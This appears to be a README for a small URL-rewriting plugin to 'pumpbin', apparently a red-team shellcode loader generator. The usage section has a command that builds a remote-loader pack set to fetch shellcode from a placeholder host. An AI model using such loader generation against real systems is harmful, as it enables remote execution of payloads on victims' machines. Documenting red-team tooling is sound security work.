# url-prefix-demo

Tiny external `format-url` module written in Python. It receives a remote payload URL as UTF-8 and returns a rewritten URL string.

## Install

```bash
mkdir -p ~/.config/pumpbin/modules/url-prefix-demo
cp url_prefix_demo.py pumpbin-module.toml ~/.config/pumpbin/modules/url-prefix-demo/
chmod +x ~/.config/pumpbin/modules/url-prefix-demo/url_prefix_demo.py
pumpbin-cli module list --options --id url-prefix-demo
```

## Test

```bash
printf 'payload.bin' > /tmp/url.txt
pumpbin-cli module test url-prefix-demo --input /tmp/url.txt --output - --arg prefix=https://cdn.example/
```

## Use

Bake the module into a remote loader pack with the format-url slot, then scope runtime args by module id:

```bash
pumpbin-cli generate --pack remote-loader.b1n --shellcode https://team.example/payload.bin \
  --module-config module:url-prefix-demo.prefix=https://cdn.example/
```
